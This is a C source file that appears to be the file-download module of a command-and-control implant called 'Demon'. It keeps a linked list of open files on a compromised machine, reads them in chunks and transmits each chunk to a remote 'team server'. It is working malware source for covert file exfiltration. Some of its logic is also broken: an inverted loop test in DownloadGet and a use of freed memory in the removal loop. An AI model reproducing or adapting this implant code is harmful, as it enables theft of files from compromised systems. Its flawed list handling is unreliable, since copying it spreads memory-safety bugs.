#include <Demon.h>

#include <Core/MiniStd.h>

/* Add file to linked list with type (upload/download) */
PDOWNLOAD_DATA DownloadAdd( HANDLE hFile, DWORD MaxSize )
{
    PDOWNLOAD_DATA Download = NULL;

    Download           = NtHeapAlloc( sizeof( DOWNLOAD_DATA ) );
    Download->FileID   = RandomNumber32();
    Download->hFile    = hFile;
    Download->Size     = MaxSize;
    Download->State    = DOWNLOAD_STATE_RUNNING;
    Download->Next     = Instance.Downloads;

    /* Push to linked list */
    Instance.Downloads = Download;

    PRINTF( "Instance.Downloads => %p\n", Instance.Downloads )

    return Download;
}

/* Get download data from linked list */
PDOWNLOAD_DATA DownloadGet( DWORD FileID )
{
    PDOWNLOAD_DATA Download = NULL;

    for ( Download = Instance.Downloads; Download == NULL; Download = Download->Next )
    {
        if ( Download->FileID == FileID )
            break;
    }

    return Download;
}

/* Free's download and returns next download from specified download object. */
VOID DownloadFree( PDOWNLOAD_DATA Download )
{
    /* close file handle. */
    if ( Download->hFile )
        Instance.Win32.NtClose( Download->hFile );

    PUTS( "Free download object" )

    /* Now free the struct */
    MemSet( Download, 0, sizeof( DOWNLOAD_DATA ) );
    NtHeapFree( Download );
    Download = NULL;
}

BOOL DownloadRemove( DWORD FileID )
{
    PDOWNLOAD_DATA Download = NULL;
    PDOWNLOAD_DATA Last     = NULL;
    BOOL           Success  = FALSE;

    Download = Instance.Downloads;
    Last     = Instance.Downloads;

    for ( ;; )
    {
        if ( ! Download )
            break;


        if ( Download->FileID == FileID )
        {
            PRINTF( "Found Download (%x)\n", FileID )

            /* Remove download from the list. */
            Last->Next = Download->Next;

            DownloadFree( Download );

            /* return that we succeeded. */
            Success = TRUE;

            break;
        }

        Last     = Download;
        Download = Download->Next;
    }
    
    return Success;
}

/* send file chunks to team server */
VOID DownloadPush()
{
    PDOWNLOAD_DATA Download = NULL;
    PDOWNLOAD_DATA DownLast = NULL;
    PPACKAGE        Package  = NULL;

    Download = Instance.Downloads;

    /* TODO: Check if we have some downloads
     *       If not then free the chunk memory. */

    /* process current running downloads () */
    for ( ;; )
    {
        if ( ! Download )
            break;

        /* seems like we have some current downloads
         * allocate a chunk of memory to use for the chunks. */
        if ( ! Instance.DownloadChunk.Buffer )
        {
            Instance.DownloadChunk.Buffer = NtHeapAlloc( Instance.Config.Implant.DownloadChunkSize );
            Instance.DownloadChunk.Length = Instance.Config.Implant.DownloadChunkSize;

            PRINTF( "Allocated memory for DownloadChunk. Buffer:[%p] Size:[%d]\n", Instance.DownloadChunk.Buffer, Instance.DownloadChunk.Length )
        }

        PRINTF( "Download: %p\n", Download )
        if ( Download->State == DOWNLOAD_STATE_RUNNING )
        {
            DWORD Read = 0;

            PRINTF( "Download (%x) is in state DOWNLOAD_STATE_RUNNING\n", Download->FileID )

            /* Reset memory. */
            MemSet( Instance.DownloadChunk.Buffer, 0, Instance.DownloadChunk.Length );

            if ( ! Instance.Win32.ReadFile( Download->hFile, Instance.DownloadChunk.Buffer, Instance.DownloadChunk.Length, &Read, NULL ) )
                PRINTF( "ReadFile Failed: Error[%d]\n", NtGetLastError() );

            Download->Size     -= Read;
            Download->ReadSize += Read;

            /* Send chunk we read */
            if ( Read > 0 )
            {
                PUTS( "Send download chunk" )

                Package = PackageCreate( DEMON_COMMAND_FS );

                /* Add Download header. */
                PackageAddInt32( Package, 2 ); /* Download sub command */
                PackageAddInt32( Package, DOWNLOAD_MODE_WRITE );
                PackageAddInt32( Package, Download->FileID    );

                /* Download Write data (and only send what we read.) */
                PackageAddBytes( Package, Instance.DownloadChunk.Buffer, Read );

                /* Send that chunk */
                PUTS( "transmit download chunk" )
                PackageTransmit( Package, NULL, NULL );
            }

            /* if this was the last chunk we read send a finish download close request */
            if ( ( Read > 0 ) && ( ! Download->Size ) )
            {
                Package = PackageCreate( DEMON_COMMAND_FS );

                /* Add Download header. */
                PackageAddInt32( Package, 2 ); /* Download sub command */
                PackageAddInt32( Package, DOWNLOAD_MODE_CLOSE );
                PackageAddInt32( Package, Download->FileID    );

                /* Download Close data */
                PackageAddInt32( Package, DOWNLOAD_REASON_FINISHED );

                /* Send that chunk */
                PackageTransmit( Package, NULL, NULL );
            }

            /* if either what we read or the download size is 0 we are finished. */
            if ( ( ! Read ) || ( ! Download->Size ) )
            {
                PRINTF( "Read:[%d] Download->Size:[%d]. Set Download (%x) State to DOWNLOAD_STATE_REMOVE\n", Read, Download->Size, Download->FileID )

                /* Seems there is nothing else to read from the file.
                 * remove it at the end of the download routine. */
                Download->State = DOWNLOAD_STATE_REMOVE;
            }
        }

        PRINTF( "Download[%p] = Download->Next[%p]\n", Download, Download->Next )
        Download = Download->Next;
    }

    Download = Instance.Downloads;
    DownLast = NULL;

    /* why do we do that again ?
     * seems like I can't remove the download item from a linked list while iterating over it. was easier to do this. */
    for ( ;; )
    {
        if ( ! Download )
            break;

        if ( Download->State == DOWNLOAD_STATE_REMOVE )
        {
            /* we are at the beginning. */
            if ( ! DownLast )
            {
                Instance.Downloads = Download->Next;
                DownloadFree( Download );
                Download = NULL;
            }
            else
            {
                DownLast->Next = Download->Next;
                DownloadFree( Download );
                DownLast = NULL;
            }
        }
        else
        {
            DownLast = Download;
            Download = Download->Next;
        }
    }

    /* Reset memory. */
    if ( Instance.DownloadChunk.Buffer )
        MemSet( Instance.DownloadChunk.Buffer, 0, Instance.DownloadChunk.Length );
}